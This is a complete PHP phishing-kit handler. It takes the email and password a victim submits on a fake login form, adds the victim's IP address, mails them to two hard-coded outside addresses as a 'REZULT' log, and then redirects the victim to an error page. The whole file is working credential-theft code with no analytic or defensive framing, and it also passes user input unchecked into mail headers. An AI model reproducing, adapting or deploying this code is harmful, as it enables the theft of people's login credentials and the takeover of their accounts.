<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ GLOBAL REZULT +--------------\n";
$message .= "Username : ".$_POST['email']."\n";
$message .= "Password: ".$_POST['Password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By C D E E Q-----------------\n";
$send = "theunis.blackhorse@gmail.com,papasmove@yandex.com";
$subject = "Global Source Rezult $ip ";
$headers = "From: Ali<logs@o2.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: error.php?email=".$_POST['email']);
	  